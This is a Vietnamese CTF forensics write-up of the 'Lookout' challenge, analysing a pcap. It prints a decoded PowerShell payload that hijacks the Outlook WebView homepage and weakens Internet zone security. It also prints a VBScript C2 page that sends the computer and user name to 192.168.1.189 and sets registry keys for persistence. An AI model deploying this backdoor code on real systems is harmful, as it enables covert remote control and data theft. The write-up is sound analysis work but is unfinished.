---
title: (VietNamese) BKISC CTF 2026 Writeup (Author)
date: 2026-3-11 08:19:33
top_img: /img/bkisc/bkisc.png
cover: /img/bkisc/bkisc.png
categories:
  - Forensics
  - Writeup CTF
toc: true
---
> Trong cuộc thi `BKISC CTF 2026` năm nay, mình có đóng góp một thử thách mảng Forensics


# Forensic / Lookout
![image](https://hackmd.io/_uploads/rkqtpYRRZl.png)
Mở chall thì mình thấy 1 file pcap ở desktop
![image](https://hackmd.io/_uploads/HkB-k5AC-e.png)
File pcap này khá nhiều trafic nhưng mình lọc thấy get 1 file report.txt
![image](https://hackmd.io/_uploads/HkS6k5CCWx.png)
Nội dung trong file như sau 
```

Invoke-Command ([scriptblock]::Create([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('JAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAFAAYQB0AGgAXQA6ADoARwBlAHQAVABlAG0AcABGAGkAbABlAE4AYQBtAGUAKAApACAAKwAgACIALgByAGUAZwAiAA0ACgANAAoAJAByAGUAZwBDAG8AbgB0AGUAbgB0ACAAPQAgAEAAIgANAAoAVwBpAG4AZABvAHcAcwAgAFIAZQBnAGkAcwB0AHIAeQAgAEUAZABpAHQAbwByACAAVgBlAHIAcwBpAG8AbgAgADUALgAwADAADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADYALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADUALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMATwBGAFQAVwBBAFIARQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwATwBmAGYAaQBjAGUAXAAxADQALgAwAFwATwB1AHQAbABvAG8AawBcAFcAZQBiAHYAaQBlAHcAXABJAG4AYgBvAHgAXQANAAoAIgB1AHIAbAAiAD0AIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQA4ADkAOgA4ADMAOAA2AC8AcABsAHUAZwBpAG4ALwBzAGUAYQByAGMAaAAvACIADQAKACIAcwBlAGMAdQByAGkAdAB5ACIAPQAiAHkAZQBzACIADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEUAeAB0AFwAUwB0AGEAdABzAFwAewAyADYAMQBCADgAQwBBADkALQAzAEIAQQBGAC0ANABCAEQAMAAtAEIAMABDADIALQBCAEYAMAA0ADIAOAA2ADcAOAA1AEMANgB9AFwAaQBlAHgAcABsAG8AcgBlAF0ADQAKACIARgBsAGEAZwBzACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADQADQAKAA0ACgBbAEgASwBFAFkAXwBDAFUAUgBSAEUATgBUAF8AVQBTAEUAUgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAEkAbgB0AGUAcgBuAGUAdAAgAFMAZQB0AHQAaQBuAGcAcwBcAFoAbwBuAGUAcwBcADIAXQANAAoAIgAxADQAMABDACIAPQBkAHcAbwByAGQAOgAwADAAMAAwADAAMAAwADAADQAKACIAMQAyADAAMAAiAD0AZAB3AG8AcgBkADoAMAAwADAAMAAwADAAMAAwAA0ACgAiADEAMgAwADEAIgA9AGQAdwBvAHIAZAA6ADAAMAAwADAAMAAwADAAMwANAAoAIgBAAA0ACgANAAoAUwBlAHQALQBDAG8AbgB0AGUAbgB0ACAALQBQAGEAdABoACAAJAB0AGUAbQBwAFIAZQBnAEYAaQBsAGUAIAAtAFYAYQBsAHUAZQAgACQAcgBlAGcAQwBvAG4AdABlAG4AdAAgAC0ARQBuAGMAbwBkAGkAbgBnACAAVQBuAGkAYwBvAGQAZQANAAoAJgAgAHIAZQBnAC4AZQB4AGUAIABpAG0AcABvAHIAdAAgACIAYAAiACQAdABlAG0AcABSAGUAZwBGAGkAbABlAGAAIgAiAA0ACgBSAGUAbQBvAHYAZQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAHQAZQBtAHAAUgBlAGcARgBpAGwAZQAgAC0ARgBvAHIAYwBlAA0ACgA='))))
```
Decode ra được script 
```powershell
$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"

$regContent = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"@

Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
& reg.exe import "`"$tempRegFile`""
Remove-Item -Path $tempRegFile -Force

```
Nội dung script trên
```
### 🔍 Phân tích nhanh PowerShell script (Base64)

**Chức năng chính:**
- Giải mã chuỗi Base64 → tạo nội dung `.reg`
- Ghi file registry tạm → import bằng `reg.exe`
- Xóa file sau khi chạy

**Hành vi đáng ngờ:**
1. **Chèn URL vào Outlook WebView**
   - Thêm vào:
     - `HKCU\Software\Microsoft\Office\14.0/15.0/16.0\Outlook\Webview\Inbox`
   - Giá trị:
     - `http://192.168.1.189:8386/plugin/search/`
   → Có thể dùng để inject nội dung / theo dõi email

2. **Giảm mức bảo mật Internet Settings**
   - Sửa các key trong:
     - `...\Internet Settings\Zones\2`
   → Cho phép script/ActiveX → tăng nguy cơ khai thác

3. **Ghi vào Explorer Stats**
   - Có thể dùng để tracking hoặc persistence
```

 `GET /plugin/search/`
```
GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
Connection: Keep-Alive


HTTP/1.1 200 OK
Server: Microsoft-IIS/8.5
Content-Type: text/html; charset=UTF-8
Date: Wed, 01 Oct 2025 01:14:30 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Content-Length: 3010

<html>
<head>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<meta http-equiv="refresh" content="10">
<meta http-equiv="Cache-Control" content=NO-CACHE, no-store, must-revalidate, max-age=0" />
<meta http-equiv="Pragma" content="no-cache" />
<meta http-equiv="EXPIRES" CONTENT="0">
<title>Outlook</title>
<style>
body {
overflow: hidden;
border: 0px;
padding: 0px;
margin: 0px;
}
</style>
<script id=clientEventHandlersVBS language=vbscript>
<!--
On Error Resume Next
Function GetEnvironment()
On Error Resume Next
Set sh = outlookapp.CreateObject("Wscript.Shell")
compname = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
usern = sh.ExpandEnvironmentStrings("%USERNAME%")
r = BaseDecode(compname & "|" & usern,1)
GetEnvironment = r
End Function
Function SetRegKey(subkey,value,valuetype)
On Error Resume Next
Set oL = outlookapp.CreateObject("Wscript.Shell")
ol.RegWrite subkey, value, valuetype
End Function
Function BaseDecode(value, LE)
On Error Resume Next
With outlookapp.CreateObject("Msxml2.DOMDocument").CreateElement("aux")
.DataType = "bin.base64"
if LE then
.NodeTypedValue = StrToBytes(value, "utf-16le", 2)
else
.NodeTypedValue = StrToBytes(value, "utf-8", 3)
end if
BaseDecode = .Text
End With
End Function
Function requestpage(uri, rR)
On Error Resume Next
vi = Left(outlookapp.version,4)
d = rR
set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
oP.open "POST", uri,false
oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
oP.setRequestHeader "Content-Length", Len(d)
oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi
oP.setOption 2, 13056
oP.send Replace(d, vbLf, "")
requestpage = oP.responseText
End Function
Function StrToBytes(strn, cset, pos)
On Error Resume Next
With outlookapp.CreateObject("ADODB.Stream")
.Type = 2
.Charset = cset
.Open
.WriteText strn
.Position = 0
.Type = 1
.Position = pos
StrToBytes = .Read
.Close
End With
End function
O = ""
uriloc = "http://192.168.1.189:8386/plugin/search/"
Set outlookapp = window.external.OutlookApplication
Sub window_onload()
O = GetEnvironment()
rul = requestpage(uriloc, chr(34) & O & chr(34))
if not rul = "" Then
Set box = outlookapp.GetNameSpace("MAPI")
Set fold = box.GetDefaultFolder(9)
val1 = SetRegKey("HKCU\" & "Software\Microsoft\Office\"  & Left(outlookapp.version,4) & "\Outlook\UserInfo" & "\" & "KEY", Split(rul,"||")(0), "REG_SZ")
val2 = SetRegKey("HKCU\Software\Microsoft\Office\" & Left(outlookapp.version,4) & "\Outlook\Webview\Inbox\URL", Split(rul,"||")(1), "REG_SZ")
val3 = SetRegKey("HKCU\Software\Microsoft\Internet Explorer\Styles\MaxScriptStatements", &Hffffffff, "REG_DWORD")
Set outlookapp.ActiveExplorer.CurrentFolder = fold
End if
End Sub
-->
</script>
</head>
<body>
<object classid="CLSID:0006F063-0000-0000-C000-000000000046" id="SpeculaViewID" data="" width="100%" height="100%"></object>
</body>
</html>
GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:14:41 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:14:51 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:15:01 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


GET /plugin/search/ HTTP/1.1
Accept: */*
Accept-Language: en-GB
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Microsoft Outlook 16.0.18925)
Host: 192.168.1.189:8386
If-None-Match: "8646f5e2ef9147e9bf57b0632d206f94af957e55"
Connection: Keep-Alive


HTTP/1.1 304 Not Modified
Server: Microsoft-IIS/8.5
Date: Wed, 01 Oct 2025 01:15:11 GMT
Etag: "8646f5e2ef9147e9bf57b0632d206f94af957e55"


```
Giải thích
```
### 🔍 Tóm tắt hành vi script

- **PowerShell (giai đoạn 1):**
  - Giải mã Base64 → tạo và import file `.reg`
  - Chèn URL độc (`http://192.168.1.189:8386/...`) vào Outlook WebView
  - Hạ mức bảo mật Internet Settings

- **Outlook WebView (giai đoạn 2):**
  - Tự động gọi đến server nội bộ :contentReference[oaicite:0]{index=0}
  - Nhận HTML + VBScript và thực thi trong Outlook
  - Thu thập thông tin máy (username, computer name)
  - Gửi về server và nhận lệnh điều khiển
  - Tiếp tục sửa registry để duy trì truy cập

- **Cơ chế tổng thể:**
  - PowerShell → sửa registry → Outlook load WebView → chạy script → kết nối C2

- **Kết luận:**
  👉 Đây là **malware/backdoor nhiều giai đoạn**, lợi dụng Outlook để điều khiển máy từ xa
```
Trong ouput có 1 dòng là : `o4WlfbKbx1xik1TgTQGeOQ` chatlgpt bảo có thể là key để xor nên mình note lại